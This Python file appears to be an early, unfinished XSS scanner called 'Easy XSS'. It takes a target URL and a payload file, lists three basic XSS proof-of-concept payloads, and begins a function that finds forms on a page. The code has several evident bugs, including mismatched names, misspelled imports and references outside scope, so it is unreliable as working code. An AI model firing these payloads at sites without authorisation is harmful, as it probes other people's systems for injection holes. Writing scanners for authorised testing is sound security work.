import requests #HTTP requests (Post and get requests)
import urllib #Encodes URLS
from bs4 import beautifulsoup #Parse html and locate input forms
import mechanize # making a browser to interact with xss forms
import selenium # inject payloads
import pyppeteer # websocketing
import scrapy #locates multiple input points
import argparse # Handles command line prompts


def main():
    # Creates argument parser
    parser = argparse.ArgumentParser(Description="Easy XSS")


    # The following 2 lines of code just define the necessary flags in the script
    parser.add_argument('-u', '--url', required=True, help='Target for the XSS scanner')
    parser.add_argument('-p', '--payload', required=True, help='Payload with XSS scripts')


    # Parses the flags and stores them in args
    args = parser.parse_args()


defaultPayload = [
    "<script>alert(1)</script>",
    "<svg/onload=alert(1)>",
    "<script>alert('XSS')</script>",
]


if args.payloads:
    try:
        with open(args.payloads, 'r') as f:
            payloads = [line.strip() for line in f.readlines()]
    except FileNotFoundError:
        print("Payload file not found. Using default payloads.")
        payloads = default_payloads
else:
    payloads = default_payloads

def formFinder(url):
    """
    Fetches and parses forms
    """
    try:
        response = requests.get(url)
        soup = BeautifulSoup(response.content, 'html parser')    
        return soup.find_all ("form")
    except Exception as e:
        print(f"Error finding forms:{e}")
        return []
    
